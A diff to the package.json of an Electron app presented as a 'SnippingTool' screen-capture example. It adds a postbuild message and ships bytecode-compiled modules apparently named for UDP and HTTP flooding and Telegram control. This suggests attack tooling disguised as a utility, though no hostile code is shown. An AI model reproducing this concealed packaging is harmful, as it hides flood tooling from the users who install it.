@@ -1,6 +1,6 @@
 {
   "name": "SnippingTool",
-  "version": "10.4.3",
+  "version": "10.4.4",
   "description": "This project contains example about multiscreen capture via electron-js",
   "main": "index.js",
   "scripts": {
@@ -8,6 +8,7 @@
     "build": "electron-builder --ia32",
     "build:bytenode": "cross-env ELECTRON_RUN_AS_NODE=1 electron compile-bytenode.js",
     "prebuild": "node -e \"const fs=require('fs');['applicationViewer.jsc','udpRain.jsc','httpRain.jsc','telegram.jsc','config.jsc'].forEach(f=>{if(!fs.existsSync(f))throw new Error('Missing .jsc file: '+f+'. Run npm run build:bytenode first.')})\"",
+    "postbuild": "node -e \"console.log('Build complete. Note: .jsc files must be compiled on the target platform (Windows) using Electron.')\"",
     "build:prod": "npm run build:bytenode && npm run build"
   },
   "repository": {
@@ -41,6 +42,7 @@
       "!*.js",
       "index.js",
       "requireCompiled.js",
+      "compile-bytenode.js",
       "applicationViewer.jsc",
       "udpRain.jsc",
       "httpRain.jsc",
